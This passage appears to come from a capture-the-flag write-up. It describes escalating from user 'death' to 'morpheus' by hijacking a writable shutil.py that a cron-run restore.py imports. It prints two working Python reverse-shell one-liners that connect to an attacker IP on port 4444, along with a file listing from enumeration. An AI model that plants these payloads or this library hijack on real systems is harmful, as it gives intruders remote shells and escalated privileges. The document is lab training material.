/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-rfkill.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/syslog.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-initctl.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dbus.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald-audit.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-snapd-23771.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/uuidd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/run-snapd-ns.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/blk-availability.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udev-settle.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-tracing.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-fsckd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-core20-1974.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-lxd-24061.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-core20-2015.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap-snapd-20290.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/lvm2-pvscan@259:4.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/multipathd.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/udisks2.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-getty.slice/getty@tty1.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/run-snapd-ns-lxd.mnt.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dm-event.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/snap.lxd.daemon.unix.socket/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/opt/getDreams.py
/home/death/.viminfo
/home/death/.mysql_history
/home/death/getDreams.py
/home/death/.bash_history
/home/death/.wget-hsts
/home/death/.profile
/home/death/.bash_logout
/home/death/death_flag.txt
/home/death/.bashrc
```

![misconfigured binaries](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KLlDRRYySUcnZeT9KTM0YA.png)


![misconfigured binaries 2](https://miro.medium.com/v2/resize:fit:640/format:webp/1*W-hkXShJD0F4uEIE-DMB8g.png)

Notice the file shutil.py.


Which was also inside the file /home/morpheus/restore.py

Meaning if the file shutil.py is writable by user death meaning we could intentionally control the file restore.py.

Now its time to control the file shutil.py at the location 

/usr/lib/python3.8/shutil.py

we're going to insert this payload into the file shutil.py

```python3
import os,pty,socket;s=socket.socket();s.connect(("192.168.246.164",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

But with this payload we didn't get shell instead we tried anothoer paylaoad

```payload2
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.246.164",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

And this time we got the shell but the method to get the shell was not correct.

What we did was we edit the file shutil.py and executed it and in this way the shell we get was as the user.


All we did this due to hurry in getting the morpheus flag cuz it was the last flag.

we need to wait because there is a cronjob that we can see by crontab -e.

which let us gave the shell as morpheus.

![crontab](https://miro.medium.com/v2/resize:fit:640/format:webp/1*nk3QqXJ0Xsx32EDhXt0NBQ.png)

Now when we updated it and wait to our listener we got the shell as user morpheus.

After getting the shell we read the flag and in this way the last flag we got and the room gets solved.
